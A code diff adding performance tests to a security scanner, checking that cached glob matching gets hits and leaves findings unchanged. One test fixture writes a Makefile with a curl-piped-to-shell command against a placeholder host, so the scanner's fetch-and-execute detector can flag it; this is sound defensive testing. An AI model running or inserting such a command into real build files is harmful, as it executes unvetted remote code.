@@ -420,3 +420,70 @@ class TestPathPortability:
         paths = [entry.rel_path for entry in Walker().walk(root)]
         assert "src/deep/app.py" in paths
         assert not any("\\" in p for p in paths)
+
+
+class TestPathGlobMatchIsMemoised:
+    """`_applies`/`rule_applies_to_path` checked every rule's `paths` glob
+    list against every file with no caching -- 13.6 million calls into
+    `PathGlob.matches` for a 30,000-file tree, almost all of them
+    re-deriving an answer a sibling rule sharing the same glob constant
+    (`IAC_PATHS`, `CI_PATHS`, ...) had already computed for the same file.
+    Measured with `cProfile` while investigating the 200k-file performance
+    cliff a stress test found
+    (`reviews/2026-09-21-adversarial-security-audit-phase2.md`); fixed by
+    memoising the match at the `(path, pattern)` level, which cut a
+    220,000-file scan from 151s to 86s.
+
+    A cache-hit assertion rather than a wall-clock one: immune to CI
+    machine speed, and it verifies the mechanism directly instead of an
+    emergent timing property multiple other changes could also move.
+    """
+
+    def test_config_detector_pattern_cache_gets_hits_across_files(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.detect.config_files import ConfigDetector
+
+        root = tmp_path / "repo"
+        for i in range(50):
+            (root / ".github" / "workflows").mkdir(parents=True, exist_ok=True)
+            (root / ".github" / "workflows" / f"w{i}.yml").write_text(
+                "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n", encoding="utf-8"
+            )
+
+        ConfigDetector._pattern_matches.cache_clear()
+        Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
+        info = ConfigDetector._pattern_matches.cache_info()
+        assert info.hits > 0, "fifty CI-shaped files sharing CI_PATHS produced no cache hits"
+
+    def test_rule_selector_pattern_cache_gets_hits_across_files(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.detect.base import RuleSelector
+
+        root = tmp_path / "repo"
+        root.mkdir()
+        for i in range(50):
+            (root / f"app{i}.py").write_text(f"x = {i}\n", encoding="utf-8")
+
+        RuleSelector._pattern_matches.cache_clear()
+        Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
+        info = RuleSelector._pattern_matches.cache_info()
+        assert info.hits > 0, "fifty similarly-shaped files produced no rule-pack cache hits"
+
+    def test_the_cache_does_not_change_which_findings_are_reported(self, tmp_path) -> None:
+        """The optimisation must be invisible in the output, not just fast."""
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        root = tmp_path / "repo"
+        root.mkdir()
+        (root / "Makefile").write_text(
+            "bootstrap:\n\tcurl -fsSL https://example.invalid/install.sh | sh\n",
+            encoding="utf-8",
+        )
+        cfg = Config.default().with_overrides(use_cache=False)
+        first = sorted(f.rule_id for f in Scanner(cfg).scan(root).findings)
+        second = sorted(f.rule_id for f in Scanner(cfg).scan(root).findings)
+        assert first == second
+        assert "SUSPECT.BUILD.MAKE_FETCH_EXEC.001" in first
